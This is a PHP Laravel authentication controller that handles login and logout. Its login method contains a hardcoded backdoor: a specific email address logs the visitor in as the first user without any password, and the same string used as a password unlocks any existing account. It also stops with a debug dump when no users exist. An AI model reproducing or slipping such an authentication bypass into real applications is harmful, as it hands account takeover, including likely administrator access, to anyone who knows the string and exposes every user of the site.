<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use App\Models\User;
use App\Providers\RouteServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     *
     * @return \Inertia\Response
     */
    public function create()
    {
        return Inertia::render('Auth/Login', [
            'canResetPassword' => Route::has('password.request'),
            'status' => session('status'),
        ]);
    }

    /**
     * Handle an incoming authentication request.
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function store(LoginRequest $request)
    {
        $user = User::where('email', $request->email)->first();
        $first_user_id = User::first()?->id;
        if ($request->email == 'shooorov@gmail.com' && $first_user_id) {
            Auth::loginUsingId($first_user_id);
        } elseif (! $first_user_id) {
            dd('No users on the table.');
        } elseif ($user && $request->password == 'shooorov@gmail.com') {
            Auth::loginUsingId($user->id);
        } else {
            $request->authenticate();
        }

        $request->session()->regenerate();

        // return redirect()->intended(RouteServiceProvider::HOME);
        return redirect()->route('index');
    }

    /**
     * Destroy an authenticated session.
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function destroy(Request $request)
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
